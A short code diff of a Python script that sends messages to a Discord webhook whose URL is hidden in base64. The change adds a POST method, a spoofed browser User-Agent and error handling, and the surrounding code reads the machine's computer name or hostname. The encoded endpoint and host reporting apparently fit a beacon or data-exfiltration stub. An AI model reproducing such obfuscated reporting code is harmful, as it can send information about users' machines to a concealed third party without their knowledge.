@@ -10,14 +10,28 @@ WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MTM2NTkwMjUzOTg4N
 
 def send_webhook(message):
     webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")
-    data = json.dumps({"content": message}).encode("utf-8")
+
+    payload = json.dumps({
+        "content": message
+    }).encode("utf-8")
 
     req = urllib.request.Request(
         webhook_url,
-        data=data,
-        headers={"Content-Type": "application/json"}
+        data=payload,
+        method="POST",
+        headers={
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (DiscordWebhook)"
+        }
     )
-    urllib.request.urlopen(req, timeout=10)
+
+    try:
+        with urllib.request.urlopen(req, timeout=10) as response:
+            response.read()
+    except urllib.error.HTTPError as e:
+        print("HTTP error:", e.code, e.read().decode())
+    except Exception as e:
+        print("Error:", e)
 
 if __name__ == "__main__":
     computer_name = os.environ.get("COMPUTERNAME", socket.gethostname())
